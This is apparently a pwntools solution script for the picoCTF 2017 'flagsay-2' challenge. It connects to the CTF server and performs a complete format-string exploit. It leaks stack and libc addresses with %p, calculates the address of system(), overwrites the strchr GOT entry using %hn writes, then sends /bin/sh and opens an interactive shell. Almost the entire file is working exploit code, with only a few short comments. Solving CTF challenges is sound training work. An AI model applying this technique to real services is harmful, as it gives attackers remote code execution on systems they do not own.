from pwn import *

def get(r, num):
    send(r, "%" + str(num) + "$p")
    ret = r.recvuntil(" //                                                     ")
    r.recvline()
    return ret.split("\n")[2].strip().strip("/").strip()
    
def send(r, line):
    r.sendline(line)

#r = process("./flagsay-2")
r = remote("shell2017.picoctf.com", 46133)

n17 = get(r, 17)

n18 = get(r, 18)

n11 = get(r, 11)

libcbase = hex(int(n11, 16) - 0x21b43) #__libc_start_main+243 offset

system = hex(int(n11, 16) + 0x2497d) #system offset: 0x3a940, 262544

printfgot = "0x8049970"

n1 = hex(int(n17, 16) - 524)

send(r, "%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %134518878p %n  %n")
#writes 0x08049980 and 0x08049982 onto the stack, which is strchr got



ret = r.recvuntil(" //                                                     ")
r.recvline()

print ("n17: " + n17)
print ("n18: " + n18)
print ("libc: " + libcbase)
print ("system: " + system)

num1 = int("0x" + str(system)[2:][4:], 16)
num2 = int("0x" + str(system)[2:][:-4], 16)

print (num1)
print (num2 - num1)

send(r, "%" + str(num1 - 129) + "x%53$hn%" + str(num2 - num1) + "x%55$hn")
#writes the address of system into strchr got

send(r, "/bin/sh")
ret = r.recvuntil(" //                                                     ")
r.recvline()
print (ret)

r.interactive()

r.close()
